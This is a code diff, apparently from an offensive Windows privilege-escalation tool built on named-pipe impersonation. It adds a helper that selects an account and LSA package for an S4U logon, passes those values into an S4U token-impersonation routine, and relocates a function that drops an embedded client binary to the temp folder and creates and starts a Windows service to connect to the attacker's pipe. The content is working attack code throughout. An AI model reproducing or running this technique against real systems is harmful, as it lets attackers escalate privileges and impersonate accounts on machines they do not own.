@@ -11,62 +11,51 @@ namespace NamedPipeImpersonation.Library
 
     internal class Utilities
     {
-        public static IntPtr StartNamedPipeClientService()
+        public static bool GetS4uLogonAccount(
+            out string upn,
+            out string domain,
+            out LSA_STRING pkgName,
+            out TOKEN_SOURCE tokenSource)
         {
-            IntPtr hSCManager;
-            string command;
-            var hService = IntPtr.Zero;
+            bool status = Helpers.GetLocalAccounts(out Dictionary<string, bool> localAccounts);
+            upn = null;
+            domain = null;
+            pkgName = new LSA_STRING();
+            tokenSource = new TOKEN_SOURCE();
 
-            if (Globals.UseDropper)
+            if (status)
             {
-                try
+                foreach (var account in localAccounts)
                 {
-                    Globals.BinaryPath = string.Format(@"{0}\PrivFuPipeClient.exe", Path.GetTempPath().TrimEnd('\\'));
-                    File.WriteAllBytes(Globals.BinaryPath, Globals.BinaryData);
+                    if (account.Value)
+                    {
+                        upn = account.Key;
+                        domain = Environment.MachineName;
+                        pkgName = new LSA_STRING(Win32Consts.MSV1_0_PACKAGE_NAME);
+                        tokenSource = new TOKEN_SOURCE("User32");
+                        break;
+                    }
                 }
-                catch
+
+                if (string.IsNullOrEmpty(upn))
                 {
-                    return IntPtr.Zero;
+                    var fqdn = Helpers.GetCurrentDomainName();
+
+                    if (!Helpers.CompareIgnoreCase(fqdn, Environment.MachineName))
+                    {
+                        upn = Environment.UserName;
+                        domain = fqdn;
+                        pkgName = new LSA_STRING(Win32Consts.NEGOSSP_NAME);
+                        tokenSource = new TOKEN_SOURCE("NtLmSsp");
+                    }
+                    else
+                    {
+                        status = false;
+                    }
                 }
-
-                command = string.Format(@"{0} {1}", Globals.BinaryPath, Globals.ServiceName);
-            }
-            else
-            {
-                command = string.Format(
-                    @"{0} /c echo {1} > \\.\pipe\{1}",
-                    Environment.GetEnvironmentVariable("COMSPEC"),
-                    Globals.ServiceName);
             }
 
-            hSCManager = NativeMethods.OpenSCManager(
-                null,
-                null,
-                ACCESS_MASK.SC_MANAGER_CONNECT | ACCESS_MASK.SC_MANAGER_CREATE_SERVICE);
-
-            if (hSCManager != IntPtr.Zero)
-            {
-                hService = NativeMethods.CreateService(
-                    hSCManager,
-                    Globals.ServiceName,
-                    Globals.ServiceName,
-                    ACCESS_MASK.SERVICE_ALL_ACCESS,
-                    SERVICE_TYPE.WIN32_OWN_PROCESS,
-                    START_TYPE.DEMAND_START,
-                    ERROR_CONTROL.NORMAL,
-                    command,
-                    null,
-                    IntPtr.Zero,
-                    null,
-                    null,
-                    null);
-                NativeMethods.CloseServiceHandle(hSCManager);
-
-                if (hService != IntPtr.Zero)
-                    NativeMethods.StartService(hService, 0, IntPtr.Zero);
-            }
-
-            return hService;
+            return status;
         }
 
 
@@ -185,7 +174,12 @@ namespace NamedPipeImpersonation.Library
         }
 
 
-        public static bool ImpersonateWithMsvS4uLogon(string upn, string domain, List<string> localGroupSids)
+        public static bool ImpersonateWithMsvS4uLogon(
+            string upn,
+            string domain,
+            in LSA_STRING pkgName,
+            in TOKEN_SOURCE tokenSource,
+            List<string> localGroupSids)
         {
             var status = false;
 
@@ -193,7 +187,6 @@ namespace NamedPipeImpersonation.Library
             {
                 IntPtr pTokenGroups;
                 int nGroupCount = localGroupSids.Count;
-                var pkgName = new LSA_STRING(Win32Consts.MSV1_0_PACKAGE_NAME);
                 var nGroupsOffset = Marshal.OffsetOf(typeof(TOKEN_GROUPS), "Groups").ToInt32();
                 var nTokenGroupsSize = nGroupsOffset;
                 var pSidBuffersToLocalFree = new List<IntPtr>();
@@ -260,7 +253,6 @@ namespace NamedPipeImpersonation.Library
                 {
                     IntPtr pTokenBuffer = Marshal.AllocHGlobal(IntPtr.Size);
                     var originName = new LSA_STRING("S4U");
-                    var tokenSource = new TOKEN_SOURCE("User32");
                     ntstatus = NativeMethods.LsaLogonUser(
                         hLsa,
                         in originName,
@@ -301,6 +293,65 @@ namespace NamedPipeImpersonation.Library
             } while (false);
 
             return status;
+        }
+
+
+        public static IntPtr StartNamedPipeClientService()
+        {
+            IntPtr hSCManager;
+            string command;
+            var hService = IntPtr.Zero;
+
+            if (Globals.UseDropper)
+            {
+                try
+                {
+                    Globals.BinaryPath = string.Format(@"{0}\PrivFuPipeClient.exe", Path.GetTempPath().TrimEnd('\\'));
+                    File.WriteAllBytes(Globals.BinaryPath, Globals.BinaryData);
+                }
+                catch
+                {
+                    return IntPtr.Zero;
+                }
+
+                command = string.Format(@"{0} {1}", Globals.BinaryPath, Globals.ServiceName);
+            }
+            else
+            {
+                command = string.Format(
+                    @"{0} /c echo {1} > \\.\pipe\{1}",
+                    Environment.GetEnvironmentVariable("COMSPEC"),
+                    Globals.ServiceName);
+            }
+
+            hSCManager = NativeMethods.OpenSCManager(
+                null,
+                null,
+                ACCESS_MASK.SC_MANAGER_CONNECT | ACCESS_MASK.SC_MANAGER_CREATE_SERVICE);
+
+            if (hSCManager != IntPtr.Zero)
+            {
+                hService = NativeMethods.CreateService(
+                    hSCManager,
+                    Globals.ServiceName,
+                    Globals.ServiceName,
+                    ACCESS_MASK.SERVICE_ALL_ACCESS,
+                    SERVICE_TYPE.WIN32_OWN_PROCESS,
+                    START_TYPE.DEMAND_START,
+                    ERROR_CONTROL.NORMAL,
+                    command,
+                    null,
+                    IntPtr.Zero,
+                    null,
+                    null,
+                    null);
+                NativeMethods.CloseServiceHandle(hSCManager);
+
+                if (hService != IntPtr.Zero)
+                    NativeMethods.StartService(hService, 0, IntPtr.Zero);
+            }
+
+            return hService;
         }
     }
 }
